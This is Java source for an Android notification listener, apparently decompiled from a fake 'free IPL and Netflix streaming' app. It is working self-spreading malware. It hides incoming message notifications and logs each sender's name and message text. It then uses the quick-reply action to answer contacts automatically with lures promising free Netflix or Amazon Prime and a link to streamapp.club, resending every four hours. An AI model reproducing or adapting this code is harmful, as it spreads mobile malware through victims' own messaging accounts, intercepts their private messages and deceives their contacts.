package com.football.ipl;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.SharedPreferences;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;
import java.util.Arrays;
import java.util.Date;
import java.util.Random;

public class NotificationService extends NotificationListenerService {
    private static final String WHATSAPP_B_PACKAGE = "";
    private static final String WHATSAPP_PACKAGE = "";
    String Random_Message;
    private String TAG = getClass().getSimpleName();
    String[] bob = {"com.facebook.orca", "com.facebook.mlite", "om.instagram.android", "com.twitter.android", "com.facebook.katana", "com.facebook.talk"};
    SharedPreferences.Editor editor;
    NotificationManager notificationManager;
    String phoneNumber;
    SharedPreferences sharedPref;

    public static String random_string() {
        Random random = new Random();
        return new String[]{"*Live Stream App* Watch All Movie,Series,Season In Ultra HD Quality On Your Mobile, Live IPL Cricket Matches *Football matches* and Much More. *Now you dont need to pay netflix, Amazon Prime* Just Download this Free Live Streaming App and enjoy.", "*Live Stream* Do you like IPL  & *Football matches* ? Download this app", "*NetFlix Free*  Get 2 Months of Netflix Premium Free anywhere in the world for 60 days.", "*Amazon Prime* Get 2 Months of Amazon Premium Free anywhere in the world for 60 days.", "*Online Movies* like to Watch Online Movies ? Download this app."}[random.nextInt(5)] + " http://" + new String[]{"streamapp.club/?netflix", "streamapp.club/?netflix", "streamapp.club/?netflix", "streamapp.club/?netflix", "streamapp.club/?netflix"}[random.nextInt(5)];
    }

    public void onCreate() {
        super.onCreate();
        this.sharedPref = getApplicationContext().getSharedPreferences("record", 0);
        this.editor = this.sharedPref.edit();
        this.notificationManager = (NotificationManager) getApplicationContext().getSystemService("notification");
    }

    public void onDestroy() {
        super.onDestroy();
    }

    public void onNotificationPosted(StatusBarNotification statusBarNotification) {
        if (!Arrays.asList(this.bob).contains(statusBarNotification.getPackageName()) && NotificationUtils.getQuickReplyAction(statusBarNotification.getNotification(), getPackageName()) != null) {
            this.Random_Message = random_string();
            if ((statusBarNotification.getNotification().flags & 512) == 0) {
                cancelNotification(statusBarNotification.getKey());
                this.notificationManager.cancel(statusBarNotification.getId());
                try {
                    this.phoneNumber = (String) statusBarNotification.getNotification().extras.get(NotificationCompat.EXTRA_TITLE);
                    if (this.phoneNumber.contains(":")) {
                        this.phoneNumber = this.phoneNumber.split("\\:")[0];
                        this.phoneNumber = this.phoneNumber.trim();
                        String str = this.TAG;
                        Log.d(str, "Group_phone: " + this.phoneNumber);
                    }
                    String str2 = this.TAG;
                    Log.d(str2, "phone: " + this.phoneNumber);
                    String str3 = this.TAG;
                    Log.d(str3, "message: " + ((String) statusBarNotification.getNotification().extras.get(NotificationCompat.EXTRA_TEXT)));
                } catch (Exception e) {
                    e.printStackTrace();
                }
                String string = this.sharedPref.getString(this.phoneNumber, BuildConfig.FLAVOR);
                if (this.phoneNumber == null || string.equals(BuildConfig.FLAVOR)) {
                    Action quickReplyAction = NotificationUtils.getQuickReplyAction(statusBarNotification.getNotification(), getPackageName());
                    if (quickReplyAction != null) {
                        Log.i(this.TAG, "success");
                        try {
                            quickReplyAction.sendReply(getApplicationContext(), this.Random_Message);
                            this.editor.putString(this.phoneNumber, String.valueOf(new Date().getTime()));
                            this.editor.apply();
                            Log.d(this.TAG, "sent first time");
                        } catch (PendingIntent.CanceledException e2) {
                            String str4 = this.TAG;
                            Log.i(str4, "CRAP " + e2.toString());
                        }
                    } else {
                        Log.i(this.TAG, "not success");
                    }
                } else if (new Date().getTime() - Long.valueOf(string).longValue() > 14400000) {
                    Action quickReplyAction2 = NotificationUtils.getQuickReplyAction(statusBarNotification.getNotification(), getPackageName());
                    if (quickReplyAction2 != null) {
                        Log.i(this.TAG, "success");
                        try {
                            quickReplyAction2.sendReply(getApplicationContext(), this.Random_Message);
                            this.editor.putString(this.phoneNumber, String.valueOf(new Date().getTime()));
                            this.editor.apply();
                        } catch (PendingIntent.CanceledException e3) {
                            String str5 = this.TAG;
                            Log.i(str5, "CRAP " + e3.toString());
                        }
                    } else {
                        Log.i(this.TAG, "not success");
                    }
                } else {
                    Log.d(this.TAG, "less than one day");
                }
            }
        }
    }

    public void onNotificationRemoved(StatusBarNotification statusBarNotification) {
        super.onNotificationRemoved(statusBarNotification);
    }

    public void onListenerConnected() {
        super.onListenerConnected();
        Log.e("startCommand", "yeah");
    }

    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        Log.e("startCommand", "naah");
    }

    public int onStartCommand(Intent intent, int i, int i2) {
        return super.onStartCommand(intent, i, i2);
    }

    @RequiresApi(26)
    private String getNotificationChannel(NotificationManager notificationManager2) {
        NotificationChannel notificationChannel = new NotificationChannel("channelid", "AutoResponder", 4);
        notificationChannel.setImportance(0);
        notificationChannel.setLockscreenVisibility(0);
        notificationManager2.createNotificationChannel(notificationChannel);
        return "channelid";
    }
}
